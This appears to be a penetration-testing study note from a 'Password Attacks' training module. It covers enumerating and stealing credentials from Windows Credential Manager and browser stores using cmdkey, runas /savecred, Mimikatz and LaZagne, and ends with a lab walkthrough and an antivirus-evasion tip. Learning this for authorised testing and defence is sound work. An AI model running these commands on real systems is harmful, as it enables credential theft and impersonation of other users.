# NOTE — Attacking Windows Credential Manager

## ID
514

## Module
Password Attacks

## Kind
methodology

## Title
Section 13 — Attacking Windows Credential Manager

## Description
Enumerate and extract credentials stored in Windows Credential Manager (Web Credentials + Windows Credentials). Use `cmdkey`, `runas /savecred`, Mimikatz `sekurlsa::credman`, and LaZagne.

## Tags
credential-manager, dpapi, cmdkey, runas, mimikatz, lazagne, credman, vaults

## Commands
- `cmdkey /list`
- `runas /savecred /user:DOMAIN\<user> cmd`
- `mimikatz "privilege::debug" "sekurlsa::credman" exit`
- `lazagne.exe all`

## Concept Overview
Credential Manager is Windows' built-in password vault. Apps and Windows itself store creds here (RDP, Outlook, OneDrive, IE/Edge legacy). Files are protected per-user with DPAPI in:
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Roaming\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`

## Credential Types

| Type | Stored In | Example |
|------|-----------|---------|
| **Web Credentials** | Web Credentials locker | IE/legacy Edge saved logins |
| **Windows Credentials (Generic)** | Windows Credentials locker | OneDrive, Outlook, SharePoint tokens |
| **Windows Credentials (Domain Password)** | Windows Credentials locker | Saved interactive RDP logins |

## Enumeration

### As the Current User
```cmd
cmdkey /list
```
Output fields:
- `Target:` — what the cred is for (e.g. `Domain:interactive=SRV01\mcharles`)
- `Type:` — `Generic`, `Domain Password`, etc.
- `User:` — associated account

The `WindowsLive:target=virtualapp/didlogical` entry is a Microsoft account internal — ignore it.

### Impersonation via `runas /savecred`
If you see a `Domain Password` entry marked `interactive=SRV01\mcharles`, you can run any command as that user without their password:
```cmd
runas /savecred /user:SRV01\mcharles cmd
```
This spawns a new shell *with that user's token*. From there, run `cmdkey /list` again to see *that user's* stored credentials.

## Extraction Methods

### Mimikatz (in-memory)
Reads creds from LSASS that have already been loaded by the user's session.
```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```
Shows entries like:
```
credman :
 [00000000]
 * Username : mcharles@inlanefreight.local
 * Domain   : onedrive.live.com
 * Password : <plaintext>
```

### Mimikatz `dpapi::cred` (manual decrypt on disk)
For creds the current user hasn't loaded yet — decrypt the blob files directly.
```cmd
dpapi::cred /in:C:\Users\bob\AppData\Local\Microsoft\Credentials\<file>
```
Requires the user's DPAPI master key (from `sekurlsa::dpapi` or master-key files).

### LaZagne (one-shot)
LaZagne does it all — Credential Manager, browsers, Outlook, WiFi, etc. Run as the target user (or as admin to hit other users' caches).
```cmd
lazagne.exe all
lazagne.exe browsers
lazagne.exe credman
```

## Browser Credentials
Chrome / Edge / Brave store encrypted login DBs in:
```
%LocalAppData%\Google\Chrome\User Data\Default\Login Data
```
Decryption keys are protected by DPAPI. With either the user's session active or their DPAPI master key, tools like Mimikatz `dpapi::chrome` and LaZagne pull them automatically.

```cmd
mimikatz "dpapi::chrome /in:\"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data\" /unprotect"
```

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Password mcharles uses for OneDrive | **(hidden — see HTB walkthrough)** | RDP as `sadams` → `cmdkey /list` shows `Domain:interactive=SRV01\mcharles` → `runas /savecred /user:SRV01\mcharles cmd` → in new shell, `cmdkey /list` shows OneDrive entry → download + run LaZagne via certutil to extract `mcharles@inlanefreight.local` cred from `onedrive.live.com` |

## Key Takeaways
- `cmdkey /list` is a first-class enum step on Windows — always run it after gaining a shell.
- A stored "Domain Password" credential = free user pivot via `runas /savecred`. Better than cracking.
- DPAPI ties creds to user identity. Loaded creds (current session) are easy; offline DPAPI requires the master key.
- LaZagne is loud but comprehensive — run it as a fallback when you need a quick credential sweep.

## Gotchas
- `runas /savecred` only works if a credential is already saved for that user. If `cmdkey /list` doesn't show them, this won't conjure one.
- LaZagne is detected by basically every AV. Plan AV bypass or use it on systems without protection.
- DPAPI master keys rotate when the user changes their password — old `Credentials\` files may be undecryptable after a password change.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[12-attacking-lsass]] | [[14-attacking-active-directory-and-ntds]] →
<!-- AUTO-LINKS-END -->
